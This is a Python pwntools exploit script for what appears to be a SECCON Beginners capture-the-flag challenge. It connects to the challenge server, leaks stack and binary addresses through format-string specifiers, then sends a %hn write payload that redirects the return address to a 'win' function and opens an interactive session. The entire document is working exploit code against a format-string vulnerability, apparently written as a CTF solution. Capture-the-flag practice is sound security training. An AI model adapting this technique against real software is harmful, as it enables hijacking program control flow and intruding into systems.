from pwn import *
import sys

elf = ELF("chall_patched")

# io = process(elf.path, timeout=3)
io = remote('forgot-some-exploit.beginners.seccon.games', 9002)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io, gdbscript='b *printf')

p = b'%p\n%41$p\n'

io.send(p)

r = io.recvline()
return_addr = int(r[2:-1].decode(), 16) + 0x118
log.info(f'return addr: {hex(return_addr)}')

r = io.recvline()
elf.address = ((int(r[2:-1].decode(), 16) >> 12) << 12) - 0x1000
log.info(f'elf addr: {hex(elf.address)}')

sleep(1)
p = b'%%%dc%%13$hn' % (next(elf.search(asm("ret"), executable=True)) & 0xffff)
c = (elf.sym["win"] & 0xffff) - (next(elf.search(asm("ret"), executable=True)) & 0xffff)
c %= 0x10000
p += b'%%%dc%%14$hn' %  c
c = ((elf.sym["win"] >> 16) & 0xffff) - (elf.sym["win"] & 0xffff)
c %= 0x10000
p += b'%%%dc%%15$hn'  %  c
c = (elf.sym["win"] >> 32) - ((elf.sym["win"] >> 16) & 0xffff)
c %= 0x10000
p += b'%%%dc%%16$hn'  %  c

p = p.ljust(56, b'\x00')
p += p64(return_addr)
p += p64(return_addr + 8)
p += p64(return_addr + 10)
p += p64(return_addr + 12)
p += b'\n'
io.send(p)

io.interactive()